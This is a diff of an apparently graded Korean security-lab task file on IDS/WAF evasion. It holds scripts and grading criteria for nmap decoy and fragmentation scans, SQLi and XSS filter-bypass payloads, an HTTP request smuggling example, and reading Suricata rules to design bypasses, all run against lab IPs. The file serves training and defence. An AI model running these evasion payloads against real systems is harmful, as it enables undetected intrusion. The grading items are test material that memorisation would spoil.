@@ -29,20 +29,20 @@ steps:
     expect: '---'
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: secu VM 의 Suricata 룰셋(/etc/suricata/rules/local.rules) 조회 — 활성 탐지 패턴 파악해 회피 페이로드 설계
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh ccc@<secu> + ls /etc/suricata/rules/ + cat local.rules 실행
+      - 출력에 alert 또는 rule 라인 + --- 구분자
+      - 시그니처 매칭 회피 전략 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh + cat /etc/suricata/rules/*.rules
+      - suricatasc -c ruleset-stats
+      - suricata -T -v (검증 출력)
+      - python paramiko 로 원격 조회
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 로컬 Suricata 룰 조회
+      - '--- 구분자 누락'
+      - 회피 전략 언급 없음
   target_vm: attacker
   script: ssh ccc@10.20.30.1 'ls /etc/suricata/rules/ 2>/dev/null; echo ---; cat /etc/suricata/rules/local.rules
     2>/dev/null | head -20' 2>/dev/null
@@ -64,20 +64,20 @@ steps:
     expect: Stealth scan
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: nmap 스텔스 — -T1 Sneaky 타이밍(15초 간격) + -f 패킷 분할 + -D RND:3 디코이 3개로 IDS 회피
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - sudo nmap -sS -T1 -f -D RND:3 -p <ports> <IP> 실행
+      - Stealth scan completed 메시지
+      - 각 옵션(-T1, -f, -D) 의 회피 원리 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - nmap -sS -T1 -f -D RND:N -p <ports> <IP>
+      - nmap --scan-delay 15s
+      - hping3 --rand-source 분리 스캔
+      - masscan --rate 10 (저속)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - -T4/T5 사용 (스텔스 반대)
+      - 옵션 1개만 (복합 없음)
+      - 회피 원리 설명 없음
   target_vm: attacker
   script: 'sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 2>/dev/null | head -20 && echo ''Stealth
     scan completed with: T1 timing, fragmentation, 3 random decoys'''
@@ -102,20 +102,20 @@ steps:
     expect: SQLi Evasion
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: WAF SQLi 회피 6가지 페이로드 — 대소문자(uNiOn)/주석(UN/**/ION)/URL 인코딩/이중 인코딩/Null byte/Tab·newline
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 6가지 회피 기법 각각 페이로드 예시
+      - 실제 curl 요청으로 변형 payload 전송 시도
+      - WAF 정규표현식 매칭 회피 원리 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo 로 각 기법 페이로드 출력
+      - curl URL-encoded 변형 전송
+      - wafw00f + bypasswaf
+      - sqlmap --tamper
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 회피 기법 3개 이하
+      - 실제 요청 없음
+      - WAF 원리 설명 없음
   target_vm: attacker
   script: 'echo ''=== SQLi Evasion Payloads ==='' && echo ''1. Case mixing: uNiOn SeLeCt'' && echo ''2.
     Comment insertion: UN/**/ION SEL/**/ECT'' && echo ''3. URL encoding: %55%4e%49%4f%4e%20%53%45%4c%45%43%54''
@@ -143,20 +143,21 @@ steps:
     expect: XSS Evasion
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: XSS 회피 — <script> 태그 없이 event handler(onerror/onload) · SVG · data URI · template literal
+        로 JS 실행
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 6가지 회피 기법 (img onerror/svg onload/body onload/encoded/data URI/template literal) 페이로드
+      - 실제 curl 로 onerror 변형 전송
+      - WAF 의 태그 블랙리스트 한계 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo 로 각 변형 payload
+      - XSStrike / dalfox 자동 퍼징
+      - Burp Intruder payload list
+      - OWASP XSS Filter Evasion Cheat Sheet
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - <script> 만 사용
+      - 변형 3개 이하
+      - 태그 블랙리스트 한계 설명 없음
   target_vm: attacker
   script: 'echo ''=== XSS Evasion Payloads ==='' && echo ''1. Event handler: <img src=x onerror=alert(1)>''
     && echo ''2. SVG: <svg onload=alert(1)>'' && echo ''3. Body: <body onload=alert(1)>'' && echo ''4.
@@ -181,20 +182,20 @@ steps:
     expect: '---'
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: nmap 소스 포트 위장 — -g 53(DNS) 또는 80(HTTP)으로 잘못 설정된 방화벽 우회 (DNS 응답 허용 규칙 악용)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - sudo nmap -sS -g 53 -p <ports> <IP> 실행
+      - '--- 구분자 + Source port 53 allowed 설명'
+      - 상태 기반 방화벽에서는 효과 제한적 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - sudo nmap -sS -g 53 <IP>
+      - sudo nmap --source-port 80
+      - hping3 -s 53 -S -p <port> <IP>
+      - scapy IP()/TCP(sport=53)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 기본 소스 포트 사용
+      - 방화벽 규칙 해석 없음
+      - 상태 기반 한계 언급 없음
   target_vm: attacker
   script: sudo nmap -sS -g 53 -p 22,80,3000 10.20.30.80 && echo '---' && echo 'Source port 53 (DNS) often
     allowed through firewalls'
@@ -219,20 +220,22 @@ steps:
     expect: '---'
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: User-Agent 헤더 위장 — curl -H 로 기본 curl UA 대신 Chrome/120 브라우저 UA 설정. WAF·IDS의 알려진 스캐너 UA(Nikto·sqlmap·Nmap
+        NSE) 블랙리스트 우회
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 'curl -sI -H User-Agent: Mozilla/5.0 ... Chrome/120 으로 HTTP 요청'
+      - 기본 curl UA 와 위장 UA 응답 비교
+      - WAF의 UA 기반 시그니처 탐지 원리 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -A Mozilla/5.0 ... Chrome/120 Safari/537.36
+      - curl --user-agent Chrome/120
+      - wget --user-agent=...
+      - 'python requests headers={User-Agent: ...}'
+      - Burp Proxy Match and Replace 로 UA 교체
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 기본 curl/wget UA 그대로 사용
+      - 요청 없이 UA 문자열만 출력
+      - WAF 의 UA 블랙리스트 원리 설명 없음
   target_vm: attacker
   script: 'echo ''=== Default (curl) ==='' && curl -sI http://10.20.30.80:3000 2>/dev/null | grep -i server
     && echo ''=== Spoofed (Chrome) ==='' && curl -sI -H ''User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;
@@ -258,20 +261,21 @@ steps:
     expect: fragmentation
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: IP 프래그멘테이션 — sudo hping3 -S -p 3000 -f -c 3 로 TCP SYN 패킷 분할 전송. IDS 가 재조립하지 못하거나 overlapping/out-of-order
+        프래그먼트 처리 실패 시 시그니처 매칭 우회
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - sudo hping3 -S -p <port> -f -c N <IP> 실행
+      - fragmentation 키워드 + 재조립 원리 설명
+      - IDS 가 overlapping/out-of-order 프래그먼트 처리 실패 시 탐지 누락 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - sudo hping3 -S -f -p <port> <IP>
+      - sudo nmap -f / -ff / --mtu 8 <IP>
+      - fragroute 로 IP fragment overlap 공격
+      - scapy IP(flags=MF, frag=N)/TCP() 수동 제작
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - -f 옵션 누락 (분할 없음)
+      - TCP segmentation 과 IP fragmentation 혼동
+      - IDS 재조립 우회 원리 설명 없음
   target_vm: attacker
   script: sudo hping3 -S -p 3000 -f -c 3 10.20.30.80 2>&1 | head -10 && echo '---' && echo 'IP fragmentation
     splits payload across multiple packets' && echo 'IDS must reassemble fragments to detect signatures'
@@ -298,20 +302,22 @@ steps:
     expect: Request Smuggling
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 'HTTP Request Smuggling CL-TE — Content-Length 13 와 Transfer-Encoding: chunked 동시 전송. 프론트엔드(WAF/프록시)는
+        CL 로 본문 길이 계산, 백엔드는 TE chunked 로 해석 → 경계 불일치로 SMUGGLED 부분이 다음 요청으로 재해석되어 WAF 검사 완전 우회'
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 'POST / HTTP/1.1 + Content-Length + Transfer-Encoding: chunked + 0 + SMUGGLED 형식의 raw HTTP 페이로드
+        제시'
+      - CL-TE 또는 TE-CL 또는 TE-TE 분기 설명
+      - 프론트엔드와 백엔드 파싱 차이로 WAF 우회 원리 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - raw HTTP 를 echo / printf 로 출력한 뒤 curl --data-binary 또는 nc <host> <port> 로 전송
+      - Burp Suite Repeater + HTTP Request Smuggler 확장
+      - smuggler.py (defparam/smuggler)
+      - python http.client 로 chunked 수동 전송
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 일반 POST 요청만 전송 (CL-TE 구조 없음)
+      - Content-Length 또는 Transfer-Encoding 한쪽만 사용
+      - 프론트엔드/백엔드 파싱 차이 설명 없음
   target_vm: attacker
   script: 'echo ''=== HTTP Request Smuggling ==='' && echo ''CL-TE attack:'' && echo ''POST / HTTP/1.1''
     && echo ''Content-Length: 13'' && echo ''Transfer-Encoding: chunked'' && echo '''' && echo ''0'' &&
@@ -336,20 +342,21 @@ steps:
     expect: alert
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Suricata fast.log 탐지 이벤트 분석 — ssh ccc@secu 로 원격 접속 후 /var/log/suricata/fast.log tail 30.
+        시간·소스/목적지 IP·SID·메시지로부터 이전 실습(s2 nmap 스텔스, s3 SQLi, s4 XSS)이 탐지됐는지 확인해 은닉 기법 효과 평가
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh ccc@<secu> tail -30 /var/log/suricata/fast.log 실행
+      - alert 키워드 또는 No alerts found 출력 확인
+      - 탐지된 SID·시간·IP 기반으로 이전 스텝 연결짓거나 미탐지면 효과 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh + tail -30 /var/log/suricata/fast.log
+      - ssh + jq 로 eve.json alert 필터
+      - suricatasc -c stats 또는 rule-reload
+      - rsyslog/ELK 로 수집된 alert 조회
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 로컬 fast.log 조회 (secu 가 아님)
+      - alert 내용 해석 없음 — raw 출력만
+      - 이전 실습 탐지 여부 분석 없음
   target_vm: attacker
   script: ssh ccc@10.20.30.1 'tail -30 /var/log/suricata/fast.log 2>/dev/null || echo "No alerts found"'
     2>/dev/null
@@ -372,20 +379,21 @@ steps:
     expect: Random delays
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 타이밍 기반 은닉 — for 루프 + DELAY=$((RANDOM % 3 + 1)) + sleep $DELAY 로 요청 간 1~3초 랜덤 지연. IDS/IPS
+        의 일정 간격 반복 요청(스캔·브루트포스) 탐지 회피, 시간 기반 상관 분석 무력화
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - for 루프에서 RANDOM 또는 $RANDOM 으로 랜덤 지연 생성
+      - curl 요청 N회 반복 + 각 요청 사이 sleep
+      - Random delays break IDS time-correlation 원리 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - bash for + $RANDOM + sleep + curl
+      - python time.sleep(random.uniform(1,5))
+      - nmap --scan-delay 1s --max-scan-delay 10s
+      - hping3 -i u1000000 (1초 간격)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 고정 간격 sleep 사용 (랜덤 아님)
+      - 단일 요청만 전송 (루프 없음)
+      - 시간 기반 탐지 원리 설명 없음
   target_vm: attacker
   script: 'for i in 1 2 3; do DELAY=$((RANDOM % 3 + 1)); echo "Request $i: delay ${DELAY}s"; curl -s -o
     /dev/null -w ''HTTP %{http_code}'' http://10.20.30.80:3000/api/Products; echo; sleep $DELAY; done
@@ -409,20 +417,22 @@ steps:
     expect: '---'
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: IPv6 우회 — ssh ccc@web ip -6 addr show 로 web 서버의 IPv6 주소 확인. IPv4 전용 IDS/방화벽이 IPv6 트래픽을 검사하지
+        않는 점을 악용해 듀얼 스택 환경에서 IPv6 로 통신하면 탐지 없이 우회
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 'ssh + ip -6 addr show 로 IPv6 주소(fe80::, 2001:: 등) 확인'
+      - 'IPv6 evasion: many IDS/firewalls only inspect IPv4 traffic 언급'
+      - 듀얼 스택 환경에서 IPv6 가 보안 통제 우회 가능성 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh + ip -6 addr show
+      - ssh + ifconfig | grep inet6
+      - nmap -6 <IPv6>
+      - curl -6 http://[IPv6]/
+      - ping6 fe80::...
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - IPv4 주소만 조회 (ip addr 또는 ip -4)
+      - IPv6 우회 원리 설명 없음
+      - 듀얼 스택 개념 누락
   target_vm: attacker
   script: 'ssh ccc@10.20.30.80 ''ip -6 addr show 2>/dev/null'' 2>/dev/null && echo ''---'' && echo ''IPv6
     evasion: many IDS/firewalls only inspect IPv4 traffic'' && echo ''If dual-stack is enabled, IPv6 traffic
@@ -447,20 +457,21 @@ steps:
     expect: WAF Bypass SQLi
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop 로그인 엔드포인트(/rest/user/login) 대상 WAF SQLi 회피 페이로드 5종 변형 — URL-encoded OR 1=1, 대소문자
+        혼합 oR, OR true 대체 문법, + 대신 공백, || 대체 연산자. 동일 결과를 얻는 시그니처 다양화로 WAF 정규식 매칭 우회
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 5개 이상 대체 페이로드를 for 루프로 POST /rest/user/login 에 전송
+      - 각 페이로드 HTTP 상태코드 확인 (200/401/403 비교)
+      - 동일 의미(OR 1=1) 다른 시그니처 변형 원리 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - for 루프 + curl -X POST + JSON body 에 변형 페이로드 삽입
+      - sqlmap --tamper=between,space2comment,charencode 다중 tamper 조합
+      - Burp Intruder payload list + grep match
+      - ffuf -w payloads.txt 로 페이로드 퍼징
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 3개 미만의 페이로드
+      - 실제 HTTP 전송 없이 출력만
+      - 동일 의미 다른 시그니처 개념 설명 없음
   target_vm: attacker
   script: 'echo ''=== WAF Bypass SQLi Payloads ==='' && for payload in "''%20OR%201%3D1--" "''%20oR%20''1''%3D''1''--"
     "''%20OR%20true--" "''+OR+''1''%3D''1''--" "''%20||%201%3D1--"; do echo -n "Payload: $payload -> ";
@@ -487,20 +498,22 @@ steps:
     expect: Suricata Rule Analysis
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Suricata content 키워드 분석 기반 회피 페이로드 설계 — 예시 룰(content:UNION nocase; content:SELECT nocase)을
+        제시하고 5가지 회피 전략(키워드 분할 /**/ · URL 인코딩 %55 · 대체 문법 UNION ALL · 이중 인코딩 %2555 · Unicode \u0055)으로
+        content 매칭 무력화. PCRE 기반 룰은 우회 난이도 상승 언급
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Suricata 룰 예시 (content:... nocase; sid:...) 제시
+      - 최소 5가지 회피 전략 각각 변형 페이로드 예시
+      - PCRE 기반 룰은 우회가 더 어렵다는 한계 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo 로 각 회피 전략 설명
+      - suricata -T -S <rule> 로 룰 검증
+      - snort rule parser 로 content 추출
+      - ModSecurity Core Rule Set 도 유사 원리 적용
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 회피 전략 3개 이하
+      - 룰 구조 분석 없이 일반 인코딩만 나열
+      - content vs PCRE 차이 설명 누락
   target_vm: attacker
   script: 'echo ''=== Suricata Rule Analysis ==='' && echo ''Example rule:'' && echo ''alert http any
     any -> any any (msg:"SQL Injection"; content:"UNION"; nocase; content:"SELECT"; nocase; sid:1000001;)''
@@ -528,20 +541,22 @@ steps:
     expect: Anti-fingerprinting
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: nmap 시그니처 변조 — sudo nmap -sS --data-length 50 로 TCP SYN 페이로드에 50바이트 랜덤 패딩 추가. --randomize-hosts
+        대상 순서 섞기, --max-retries 1 로 재시도 줄여 프로브 특성 변경. 보안 장비가 등록한 nmap 기본 패킷 크기·순서 시그니처 무효화
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - sudo nmap -sS --data-length <N> --randomize-hosts 실행
+      - Anti-fingerprinting 키워드 + 각 옵션 원리 설명
+      - --data-length·--randomize-hosts·--scan-delay·--badsum 중 최소 2개 설명
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - sudo nmap -sS --data-length 50 --randomize-hosts <IP>
+      - sudo nmap --scan-delay 10s --max-retries 1
+      - sudo nmap --badsum (bad checksum 테스트)
+      - hping3 -d <size> -E <file> 로 페이로드 크기 조작
+      - scapy Raw(load=random_bytes) 로 수동 패딩
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 기본 nmap 스캔 (패딩·랜덤화 옵션 없음)
+      - 옵션 1개만 사용 (복합 안티핑거프린팅 없음)
+      - 보안 장비 시그니처 원리 설명 없음
   target_vm: attacker
   script: 'sudo nmap -sS --data-length 50 --randomize-hosts --max-retries 1 -p 80,3000 10.20.30.80 &&
     echo ''---'' && echo ''Anti-fingerprinting options:'' && echo ''--data-length: adds random padding
@@ -573,20 +588,22 @@ steps:
     expect: Evasion Techniques Report
     field: stdout
     semantic:
-      intent: 은닉 기법 (Evasion) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 은닉 기법 종합 보고서 /tmp/evasion_report.txt 작성 — 8개 테스트 기법(T1 슬로우 스캔·IP 분할·소스 포트 위장·SQLi 인코딩·XSS
+        대체·UA 위장·랜덤 타이밍·데이터 길이 패딩) 효과 평가 + 5가지 보안 강화 방안(Suricata 프로토콜 분석 활성·WAF 행위/ML 기반·DPI·SIEM 다중 소스
+        상관·정기 시그니처 업데이트) 정리
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - /tmp/evasion_report.txt 파일 생성 및 cat 으로 출력
+      - Tested Techniques·Effectiveness·Security Hardening 섹션 포함
+      - 최소 6개 기법 + 3개 이상 강화 방안 + 시그니처 기반 탐지 한계 지적
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo -e ... > /tmp/evasion_report.txt && cat
+      - heredoc (cat << EOF > /tmp/evasion_report.txt)
+      - tee /tmp/evasion_report.txt
+      - python 으로 텍스트 파일 작성
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(은닉 기법 (Evasion))와 무관한 기법
+      - 파일 미생성 (cat 또는 > 누락)
+      - 기법 나열만 있고 효과 평가/강화 방안 없음
+      - 시그니처 기반 탐지 한계 지적 없음
   target_vm: attacker
   script: 'echo -e ''=== Evasion Techniques Report ===\n\n[Tested Techniques]\n1. Slow scan (T1 timing)
     - Avoid time-based detection\n2. IP fragmentation - Break signature matching\n3. Source port spoofing
